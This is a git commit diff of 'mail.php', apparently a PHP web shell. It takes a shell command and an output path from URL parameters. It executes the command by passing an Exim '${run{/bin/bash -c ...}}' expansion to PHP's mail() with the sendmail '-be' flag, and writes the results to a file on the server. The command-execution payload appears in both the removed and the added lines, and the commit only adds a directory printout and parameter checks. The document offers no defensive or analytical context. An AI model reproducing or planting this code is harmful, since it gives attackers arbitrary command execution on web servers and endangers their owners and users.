f81291ecd23ed6caf3d60ba4f8c03161c965b6c1
rintod <43784357+rintod@users.noreply.github.com>
2019-06-10 18:33:54 +0700

    Update mail.php

--- mail.php
+++ mail.php
@@ -5,12 +5,22 @@
 // TO SEE RESULT ACCESS: /result.txt
 $comd = @$_GET[c];
 $fl = @$_GET[p];
-@ob_start();
-$headers = "From: rinto@plantsec.org";
-$ms = '${run{/bin/bash -c "'.$comd.' >'.$fl.'"}}';
-$senders = "rinto@plantsec.org -be";
-@mail("kreonrinto@gmail.com", "Owalah Tempix", $ms, $headers, " -f $senders ");
-$mek = @ob_get_contents();
-@ob_end_clean();
-echo $mek;
+if(function_exists("getcwd")){
+    $cw = getcwd();
+}
+else{
+    $cw = get_defined_vars()["_SERVER"]["DOCUMENT_ROOT"];
+}
+echo $cw."<br>";
+if(!empty($comd) && !empty($fl)){
+    $headers = "From: rinto@plantsec.org";
+    $ms = 'Exec: ${run{/bin/bash -c "'.$comd.' >'.$fl.'"}}';
+    $senders = "rinto@plantsec.org -be";
+    @mail("kreonrinto@gmail.com", "Owalah Tempix", $ms, $headers, " -f $senders ");
+    $mek = @ob_get_contents();
+    @ob_end_clean();
+    echo $mek;
+}else{
+    echo "Parameter c[Command] and p[Path] must me not null";
+}
 ?>
